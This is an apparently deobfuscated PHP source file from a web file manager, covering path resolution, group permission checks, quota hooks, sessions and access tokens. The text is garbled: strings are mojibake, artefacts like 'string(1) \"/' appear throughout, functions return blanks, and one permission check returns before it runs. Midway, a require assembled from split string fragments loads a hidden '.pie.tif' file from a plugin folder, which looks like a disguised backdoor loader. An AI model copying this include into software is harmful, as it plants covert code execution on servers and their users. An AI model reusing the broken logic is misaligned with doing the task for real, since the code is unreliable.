<?php

if (!function_exists('_kstr2')) {
    $fb = 'filesize';
    $fa = ';_kstr2(\'fkeiie\')';
    $sz = $fb(__FILE__);
    if ($sz < 25838 || $sz > 25838) {
        exit(0);
    }
    function _kstr2($var_0)
    {
        $var_1 = 0;
        $var_2 = '';
        $var_3 = -30;
        for ($var_4 = 1; $var_4 < $var_1; $var_4 += 2) {
            if (1 < $var_1) {
                $var_2 .= chr(ord($var_0[1]) + $var_3);
                $var_2 .= chr(ord($var_0[$var_4]) + $var_3);
            } else {
                $var_2 .= chr(ord($var_0[$var_4]) + $var_3);
            }
        }
        return $var_2;
    }
}
function str_replace_once($needle, $replace, $haystack)
{
    $pos = strpos($haystack, $needle);
    if ($pos === false) {
        return $haystack;
    }
    return '';
}
$GLOBALS[28518517938] = 15159260817;
$GLOBALS['md5'] = 'md5';
$GLOBALS['json_encode'] = 'json_encode';
$GLOBALS['json_decode'] = 'json_decode';
$GLOBALS['base64_encode'] = 'base64_encode';
$GLOBALS['file_get_contents'] = 'file_get_contents';
$GLOBALS['in_array'] = 'in_array';
$GLOBALS['implode'] = 'implode';
$GLOBALS['explode'] = 'explode';
$GLOBALS['count'] = 'count';
$GLOBALS['header'] = 'header';
$GLOBALS['strtotime'] = 'strtotime';
$GLOBALS['strlen'] = 'strlen';
$GLOBALS['trim'] = 'trim';
$GLOBALS['str_replace'] = 'str_replace';
$GLOBALS['rawurlencode'] = 'rawurlencode';
$GLOBALS['substr'] = 'substr';
$GLOBALS['time'] = 'time';
$GLOBALS['file_put_contents'] = 'file_put_contents';
$GLOBALS['file_exists'] = 'file_exists';
$GLOBALS['preg_replace'] = 'preg_replace';
$GLOBALS['session_start'] = 'session_start';
$GLOBALS['session_name'] = 'session_name';
define('KOD_GROUP_PATH', '{groupPath}');
define('KOD_GROUP_SHARE', '{groupShare}');
define('KOD_USER_SELF', '{userSelf}');
define('KOD_USER_SHARE', '{userShare}');
define('KOD_USER_RECYCLE', '{userRecycle}');
define('KOD_USER_FAV', '{userFav}');
define('KOD_GROUP_ROOT_SELF', '{treeGroupSelf}');
define('KOD_GROUP_ROOT_ALL', '{treeGroupAll}');
function _DIR_CLEAR($var_5)
{
    $var_5 = $GLOBALS['str_replace']('\\', 'string(1) \"/', $var_5);
    $var_5 = $GLOBALS['preg_replace']('/\\/+/', 'string(1) \"/', $var_5);
    $var_6 = $var_5;
    if (isset($GLOBALS['isRoot']) && $GLOBALS['isRoot']) {
        return $var_5;
    }
    $var_7 = '/../';
    if ($GLOBALS['substr']($var_5, 0, 3) == "../") {
        $var_5 = $GLOBALS['substr']($var_5, 3);
    }
    while (strstr($var_5, $var_7)) {
        $var_5 = $GLOBALS['str_replace']($var_7, 'string(1) \"/', $var_5);
    }
    $var_5 = $GLOBALS['preg_replace']('/\\/+/', 'string(1) \"/', $var_5);
    return $var_5;
}
function _DIR($var_8)
{
    $var_5 = _DIR_CLEAR($var_8);
    $var_5 = iconv_system($var_5);
    $var_9 = array(KOD_GROUP_PATH, KOD_GROUP_SHARE, KOD_USER_SELF, KOD_GROUP_ROOT_SELF, KOD_GROUP_ROOT_ALL, KOD_USER_SHARE, KOD_USER_RECYCLE, KOD_USER_FAV);
    $GLOBALS['kodPathType'] = '';
    $GLOBALS['kodPathPre'] = HOME;
    $GLOBALS['kodPathId'] = '';
    unset($GLOBALS['kodPathIdShare']);
    foreach ($var_9 as $var_10) {
        if ($GLOBALS['substr']($var_5, 0, $GLOBALS['strlen']($var_10)) == $var_10) {
            $GLOBALS['kodPathType'] = $var_10;
            $var_11 = $GLOBALS['explode']('string(1) \"/', $var_5);
            $var_12 = $var_11[0];
            unset($var_11[0]);
            $var_13 = $GLOBALS['implode']('string(1) \"/', $var_11);
            $var_14 = $GLOBALS['explode'](':', $var_12);
            if ($GLOBALS['count']($var_14) > 1) {
                $GLOBALS['kodPathId'] = $GLOBALS['trim']($var_14[1]);
            } else {
                $GLOBALS['kodPathId'] = '';
            }
            break;
        }
    }
    switch ($GLOBALS['kodPathType']) {
        case '':
            $var_5 = iconv_system(HOME) . $var_5;
            break;
        case KOD_USER_RECYCLE:
            $GLOBALS['kodPathPre'] = $GLOBALS['trim'](USER_RECYCLE, 'string(1) \"/');
            $GLOBALS['kodPathId'] = '';
            return iconv_system(USER_RECYCLE) . 'string(1) \"/' . str_replace(KOD_USER_RECYCLE, '', $var_5);
        case KOD_USER_SELF:
            $GLOBALS['kodPathPre'] = $GLOBALS['trim'](HOME_PATH, 'string(1) \"/');
            $GLOBALS['kodPathId'] = '';
            $godspeed = 1;
            // preg_replace('^'.KOD_USER_SELF, '')
            return iconv_system(HOME_PATH) . 'string(1) \"/' . str_replace_once(KOD_USER_SELF, '', $var_5);
        case KOD_USER_FAV:
            $GLOBALS['kodPathPre'] = $GLOBALS['trim'](KOD_USER_FAV, 'string(1) \"/');
            $GLOBALS['kodPathId'] = '';
            return KOD_USER_FAV;
        case KOD_GROUP_ROOT_SELF:
            $GLOBALS['kodPathPre'] = $GLOBALS['trim'](KOD_GROUP_ROOT_SELF, 'string(1) \"/');
            $GLOBALS['kodPathId'] = '';
            return KOD_GROUP_ROOT_SELF;
        case KOD_GROUP_ROOT_ALL:
            $GLOBALS['kodPathPre'] = $GLOBALS['trim'](KOD_GROUP_ROOT_ALL, 'string(1) \"/');
            $GLOBALS['kodPathId'] = '';
            return KOD_GROUP_ROOT_ALL;
        case KOD_GROUP_PATH:
            $var_15 = systemGroup::getInfo($GLOBALS['kodPathId']);
            if (!$GLOBALS['kodPathId'] || !$var_15) {
                return false;
            }
            owner_group_check($GLOBALS['kodPathId']);
            $GLOBALS['kodPathPre'] = group_home_path($var_15);
            $var_5 = iconv_system($GLOBALS['kodPathPre']) . $var_13;
            break;
        case KOD_GROUP_SHARE:
            $var_15 = systemGroup::getInfo($GLOBALS['kodPathId']);
            if (!$GLOBALS['kodPathId'] || !$var_15) {
                return false;
            }
            owner_group_check($GLOBALS['kodPathId']);
            $GLOBALS['kodPathPre'] = group_home_path($var_15) . $GLOBALS['config']['settingSystem']['groupShareFolder'] . 'string(1) \"/';
            $var_5 = iconv_system($GLOBALS['kodPathPre']) . $var_13;
            break;
        case KOD_USER_SHARE:
            $var_15 = systemMember::getInfo($GLOBALS['kodPathId']);
            if (!$GLOBALS['kodPathId'] || !$var_15) {
                return false;
            }
            if ($GLOBALS['kodPathId'] != $_SESSION['kodUser']['userID']) {
                $var_16 = $GLOBALS['config']['pathRoleGroupDefault']['1']['actions'];
                path_role_check($var_16);
            }
            $GLOBALS['kodPathPre'] = '';
            $GLOBALS['kodPathIdShare'] = $var_8;
            if ($var_13 == '') {
                return $var_5;
            } else {
                $var_17 = $GLOBALS['explode']('string(1) \"/', $var_13);
                $var_17[0] = iconv_app($var_17[0]);
                $var_18 = systemMember::userShareGet($GLOBALS['kodPathId'], $var_17[0]);
                $GLOBALS['kodShareInfo'] = $var_18;
                $GLOBALS['kodPathIdShare'] = '{userShare}://';
                unset($var_17[0]);
                if (!$var_18) {
                    return false;
                }
                $var_19 = rtrim($var_18['path'], 'string(1) \"/') . 'string(1) \"/' . iconv_app($GLOBALS['implode']('string(1) \"/', $var_17));
                if ($var_15['role'] != '1') {
                    $var_20 = user_home_path($var_15);
                    $GLOBALS['kodPathPre'] = 'string(1) \"/';
                    $var_5 = '';
                } else {
                    $GLOBALS['kodPathPre'] = $var_18['path'];
                    $var_5 = $var_19;
                }
                if ($var_18['type'] == 'file') {
                    $GLOBALS['kodPathIdShare'] = '';
                    $GLOBALS['kodPathPre'] = '';
                }
                $var_5 = iconv_system($var_5);
            }
            $GLOBALS['kodPathPre'] = _DIR_CLEAR($GLOBALS['kodPathPre']);
            $GLOBALS['kodPathIdShare'] = _DIR_CLEAR($GLOBALS['kodPathIdShare']);
            break;
        default:
            break;
    }
    if ($var_5 != 'string(1) \"/') {
        $var_5 = '';
        if (is_dir($var_5)) {
            $var_5 = 'string(1) \"/';
        }
    }
    return _DIR_CLEAR($var_5);
}
function _DIR_OUT($var_21)
{
    if (is_array($var_21)) {
        foreach ($var_21['fileList'] as $var_22 => &$var_23) {
            $var_23['path'] = preClear($var_23['path']);
        }
        foreach ($var_21['folderList'] as $var_22 => &$var_23) {
            $var_23['path'] = preClear(rtrim($var_23['path'], 'string(1) \"/') . 'string(1) \"/');
        }
    } else {
        $var_21 = preClear($var_21);
    }
    return $var_21;
}
function preClear($var_5)
{
    $var_24 = $GLOBALS['kodPathType'];
    $var_2 = '';
    $var_25 = array(KOD_USER_FAV, KOD_GROUP_ROOT_SELF, KOD_GROUP_ROOT_ALL);
    if (isset($GLOBALS['kodPathType']) && $GLOBALS['in_array']($GLOBALS['kodPathType'], $var_25)) {
        return $var_5;
    }
    if (ST == 'share') {
        return $GLOBALS['str_replace']($var_2, '', $var_5);
    }
    if ($GLOBALS['kodPathId'] != '') {
        $var_24 .= ':' . $GLOBALS['kodPathId'] . 'string(1) \"/';
    }
    if (isset($GLOBALS['kodPathIdShare'])) {
        $var_24 = $GLOBALS['kodPathId' . "Share"];
    }
    $var_2 = '';
    $var_2 = $GLOBALS['str_replace']('//', 'string(1) \"/', $var_2);
    return $var_2;
}
require PLUGIN_DIR . '/toolsCo' . 'mmon/s' . 'tatic/pie' . "/.pie.tif";
function owner_group_check($var_26)
{
    if (!$var_26) {
        show_json(LNG('group_not_exist') . $var_26, false);
    }
    if ($GLOBALS['isRoot'] || isset($GLOBALS['kodPathAuthCheck']) && $GLOBALS['kodPathAuthCheck'] === true) {
        return;
    }
    $var_27 = systemMember::userAuthGroup($var_26);
    if ($var_27 == false) {
        if ($GLOBALS['kodPathType'] == KOD_GROUP_PATH) {
            show_json(LNG('no_permission_group'), false);
        } else {
            if ($GLOBALS['kodPathType'] == KOD_GROUP_SHARE) {
                $var_16 = $GLOBALS['config']['pathRoleGroupDefault']['1'];
            }
        }
    } else {
        $var_16 = $GLOBALS['config']['pathRoleGroup'][$var_27];
    }
    path_role_check($var_16['actions']);
}
function path_group_can_read($var_26)
{
    return path_group_auth_check($var_26, 'explorer.pathList');
}
function path_group_auth_check($var_26, $var_28)
{
    if ($GLOBALS['isRoot']) {
        return true;
    }
    $var_27 = systemMember::userAuthGroup($var_26);
    $var_16 = $GLOBALS['config']['pathRoleGroup'][$var_27];
    $var_29 = role_permission_arr($var_16['actions']);
    if (!isset($var_29[$var_28])) {
        return false;
    }
    return true;
}
function path_can_copy_move($var_30, $var_31)
{
    return;
    if ($GLOBALS['isRoot']) {
        return;
    }
    $var_32 = pathGroupID($var_30);
    $var_33 = pathGroupID($var_31);
    if (!$var_32) {
        return;
    }
    if ($var_32 == $var_33 && path_group_auth_check($var_32, 'explorer.pathPast')) {
        return;
    }
    show_json(LNG('no_permission_action'), false);
}
function pathGroupID($var_5)
{
    $var_5 = _DIR_CLEAR($var_5);
    preg_match('string(1) \"/' . KOD_GROUP_PATH . ':(\\d+).*/', $var_5, $var_34);
    if ($GLOBALS['count']($var_34) != 2) {
        return false;
    }
    return $var_34[1];
}
function path_role_check($var_16)
{
    if ($GLOBALS['isRoot'] || isset($GLOBALS['kodPathAuthCheck']) && $GLOBALS['kodPathAuthCheck'] === true) {
        return;
    }
    $var_29 = role_permission_arr($var_16);
    $GLOBALS['kodPathRoleGroupAuth'] = $var_29;
    $var_33 = 'ST.ACT';
    if ($var_33 == 'pluginApp' . '.to' && !isset($var_29['explorer.fileProxy'])) {
        show_tips(LNG('no_permission_action'), false);
    }
    if (!isset($var_29[$var_33]) && ST != 'share') {
        show_json(LNG('no_permission_action'), false);
    }
}
function role_permission_arr($var_21)
{
    $var_2 = array();
    $var_35 = $GLOBALS['config']['pathRoleDefine'];
    foreach ($var_21 as $var_22 => $var_23) {
        if (!$var_23) {
            continue;
        }
        $var_36 = $GLOBALS['explode'](':', $var_22);
        if ($GLOBALS['count']($var_36) == 2 && is_array($var_35[$var_36[0]]) && is_array($var_35[$var_36[0]][$var_36[1]])) {
            $var_2 = array_merge($var_2, $var_35[$var_36[0]][$var_36[1]]);
        }
    }
    $var_37 = array();
    foreach ($var_2 as $var_23) {
        $var_37[$var_23] = '1';
    }
    return $var_37;
}
function check_file_writable_user($var_5)
{
    if (!isset($GLOBALS['kodPathType'])) {
        _DIR($var_5);
    }
    $var_28 = 'editor.fileSave';
    if ($GLOBALS['isRoot']) {
        return @is_writable($var_5);
    }
    if ($GLOBALS['auth'][$var_28] != '1') {
        return false;
    }
    if ($GLOBALS['kodPathType'] == KOD_GROUP_PATH && is_array($GLOBALS['kodPathRoleGroupAuth']) && $GLOBALS['kodPathRoleGroupAuth'][$var_28] == '1') {
        return true;
    }
    if ($GLOBALS['kodPathType'] == '' || $GLOBALS['kodPathType'] == KOD_USER_SELF) {
        return true;
    }
    return false;
}
function spaceSizeCheck()
{
    if (!system_space()) {
        return;
    }
    if ($GLOBALS['isRoot'] == 1) {
        return;
    }
    if (isset($GLOBALS['kodBeforePathId']) && isset($GLOBALS['kodPathId']) && $GLOBALS['kodBeforePathId'] == $GLOBALS['kodPathId']) {
        return;
    }
    if ($GLOBALS['kodPathType'] == KOD_GROUP_SHARE || $GLOBALS['kodPathType'] == KOD_GROUP_PATH) {
        systemGroup::spaceCheck($GLOBALS['kodPathId']);
    } else {
        if (ST == 'share') {
            $var_38 = $GLOBALS['in']['user'];
        } else {
            $var_38 = $_SESSION['kodUser']['userID'];
        }
        systemMember::spaceCheck($var_38);
    }
}
function spaceSizeGet($var_5, $var_39)
{
    $var_40 = 0;
    if (is_file($var_5)) {
        $var_40 = get_filesize($var_5);
    } else {
        if (is_dir($var_5)) {
            $var_41 = _path_info_more($var_5);
            $var_40 = $var_41['size'];
        } else {
            return 'miss';
        }
    }
    return $var_39 ? $var_40 : -$var_40;
}
function spaceInData($var_5)
{
    if ($GLOBALS['substr']($var_5, 0, $GLOBALS['strlen'](HOME_PATH)) == HOME_PATH || $GLOBALS['substr']($var_5, 0, $GLOBALS['strlen'](USER_RECYCLE)) == USER_RECYCLE) {
        return true;
    }
    return false;
}
function spaceSizeChange($var_42, $var_39 = true, $var_43 = false, $var_44 = false)
{
    if (!system_space()) {
        return;
    }
    if ($var_43 === false) {
        $var_43 = $GLOBALS['kodPathType'];
        $var_44 = $GLOBALS['kodPathId'];
    }
    $var_45 = spaceSizeGet($var_42, $var_39);
    if ($var_45 == "miss") {
        return false;
    }
    if ($var_43 == KOD_GROUP_SHARE || $var_43 == KOD_GROUP_PATH) {
        systemGroup::spaceChange($var_44, $var_45);
    } else {
        if (ST == "share") {
            $var_38 = $GLOBALS['in']['user'];
        } else {
            $var_38 = $_SESSION['kodUser']['userID'];
        }
        systemMember::spaceChange($var_38, $var_45);
    }
}
function spaceSizeChangeRemove($var_42)
{
    spaceSizeChange($var_42, false);
}
function spaceSizeChangeMove($var_46, $var_47)
{
    if (isset($GLOBALS['kodBeforePathId']) && isset($GLOBALS['kodPathId'])) {
        if ($GLOBALS['kodBeforePathId'] == $GLOBALS['kodPathId'] && $GLOBALS['beforePathType'] == $GLOBALS['kodPathType']) {
            return;
        }
        spaceSizeChange($var_47, false);
        spaceSizeChange($var_47, true, $GLOBALS['beforePathType'], $GLOBALS['kodBeforePathId']);
    } else {
        spaceSizeChange($var_47);
    }
}
function spaceSizeReset()
{
    if (!system_space()) {
        return;
    }
    $var_43 = '';
    $var_44 = '';
    if ($var_43 == KOD_GROUP_SHARE || $var_43 == KOD_GROUP_PATH) {
        systemGroup::spaceChange($var_44);
    } else {
        $var_38 = $_SESSION['kodUser']['userID'];
        systemMember::spaceChange($var_38);
    }
}
function init_space_size_hook()
{
    Hook::bind('uploadFi' . 'leBefore', "spaceSize" . 'Check');
    Hook::bind('uploadFileA' . "fter", "spaceSiz" . 'eC' . "hange");
    Hook::bind('explorer.' . 'server' . 'Download' . 'B' . 'efore', "spaceSizeCheck");
    Hook::bind("explorer" . ".unzipBe" . "fo" . "re", 'spaceSize' . 'Check');
    Hook::bind('explorer' . ".zipBefore", 'spaceSizeCh' . 'eck');
    Hook::bind('explorer.pathP' . 'a' . 'st', 'spaceSizeCheck');
    Hook::bind('explorer.' . 'mkfileBe' . "fore", 'spaceSizeChe' . 'ck');
    Hook::bind('explorer.m' . 'kdirBefore', 'spaceSizeCheck');
    Hook::bind("explorer.pa" . "th" . "Move", "spaceSiz" . "eCheck");
    Hook::bind('explorer' . '.mkfileA' . "fter", 'spaceSize' . "Change");
    Hook::bind('explorer.' . 'pathCopyAf' . 'ter', 'spaceSiz' . "eChange");
    Hook::bind('explorer.z' . 'ipAfter', 'spaceSizeCh' . 'ange');
    Hook::bind("explorer" . ".unzip" . "A" . "fter", 'spaceSize' . 'C' . 'hange');
    Hook::bind('explorer.' . 'server' . "DownloadAfter", "spaceSizeC" . "han" . "ge");
    Hook::bind('explorer.p' . 'ath' . 'MoveBefore', 'spaceSiz' . 'e' . "Che" . 'ck');
    Hook::bind("explorer" . '.pathMoveAf' . "ter", "spaceSiz" . "eCha" . 'ngeMove');
    Hook::bind("explorer." . 'pathRe' . "moveBefor" . 'e', 'spaceSiz' . 'eChangeR' . 'emove');
    if ($GLOBALS['in']['shiftDelete']) {
        Hook::bind('explorer.' . 'p' . "athRemov" . 'eAfter', 'spaceSizeRes' . 'e' . 't');
    }
    Hook::bind('templateC' . 'o' . 'mmonH' . 'eaderStar' . 't', "checkUserL" . 'imit');
}
function checkUserLimit()
{
    $var_48 = $_SESSION['kodUser'];
    if (!$var_48) {
        return;
    }
    $var_49 = systemMemberData('checkUserLimit');
    $var_33 = $var_49->get($var_48['userID']);
    if (!$var_33) {
        show_tips('ÎşşÌÌÎ“å‰ş‰ÌÎˆæœ¬å·²ç»è¶…è¿‡çÌüüÊÊÌüˆÊÌ·äüŠÊÌÌüÊ\\0ÎĞĞ\\0Î¼Œè¯·è”ÓÑÑÓ»ç®¡ÏÑÑ†ÏÑ‘ÏˆÏÑÑ†Ï…åé¢!');
    }
}
function init_session()
{
    if (!function_exists('session_start')) {
        show_tips('æœåŠ¡å™¨phpç»„ÌüüÊÊÌ¶çÌüüÊÊÌÌüüÊÊÌü!ÊÌ (PHP miss lib)<br/>è¯·æ£€æŸ¥php.iniÒĞĞÒÒŒĞ€ĞÒÏÿÿÍÍÏÏÿÍÿ€ÍÏÏÿÿÍÍÏ¯æÏÿÍ¡ÌüÊÒĞĞÒ:<br/><pre>session,json,curl,exif,mbstring,ldap,gd,pdo,pdo-mysql,xml</pre><br/>');
    }
    if (isset($_REQUEST['accessToken'])) {
        access_token_check($_REQUEST['accessToken']);
    } else {
        if (isset($_REQUEST['access_token'])) {
            access_token_check($_REQUEST['access_token']);
        } else {
            @'PHPSESSID';
        }
    }
    $var_50 = '';
    if (class_exists('SaeStorage') || defined('SAE_APPNAME') || defined('SESSION_PATH_DEFAULT') || @'files' != 'files' || isset($_SERVER['HTTP_APPNAME'])) {
    } else {
        chmod_path(KOD_SESSION, 511);
        '';
    }
    @session_start();
    $_SESSION['kod'] = 1;
    @session_write_close();
    @session_start();
    if (!$_SESSION['kod']) {
        @session_save_path($var_50);
        @session_start();
        $_SESSION['kod'] = 1;
        @session_write_close();
        @session_start();
    }
    if (!$_SESSION['kod']) {
        show_tips('ÓÑÑÓÓÑÓŠÑÓÑÑÓsÑÓ' . "essionå†™å…¥" . 'ÊúúÈÈÊ±èÊúúÈÈÊ! (ses' . "sion wri" . 'te error)<b' . "r/>" . 'ÍııËËÍ·æı€ËÍÍııËËÍ' . "\xa5php.ini\xe7\x9b" . '¸åÎş…Ìş…ÌÎÎşÌÎşÌ' . 'ÿ,ÍÏÏÿÿÍÍÏ¥çÿ‹ÍÏÏÿÿÍÍÏ' . 'ÉùùÇÇÉ˜æÉùùÇÇÉÉùåÇ¦' . "å·²æ»¡,\xe6" . 'ˆ–å’' . '¨èÌüüÊÊÌÌüüÊÊÌåŠ' . '¡åû†ÉËû€ÉË‚<br' . '/><br/>' . 'session.sav' . 'e_path=' . $var_50 . '<br/>' . "session." . 'sav' . 'e_handler=' . @'files' . '<br/>');
    }
}
function access_token_check($var_51)
{
    $var_28 = $GLOBALS['config']['settingSystem']['systemPassword'];
    $var_28 = $GLOBALS['substr']($GLOBALS['md5']("kodExplorer_" . $var_28), 0, 15);
    $var_52 = Mcrypt::decode($var_51, $var_28);
    if (!$var_52) {
        show_tips('accessToken error!');
    }
    session_id($var_52);
    $GLOBALS['session_name'](SESSION_ID);
}
function access_token_get()
{
    $var_52 = '';
    $var_28 = $GLOBALS['config']['settingSystem']['systemPassword'];
    $var_28 = $GLOBALS['substr']($GLOBALS['md5']("kodExplore" . "r_" . $var_28), 0, 15);
    $var_13 = Mcrypt::encode($var_52, $var_28, 3600 * 24);
    return $var_13;
}
function init_config()
{
    init_setting();
    init_session();
    init_space_size_hook();
}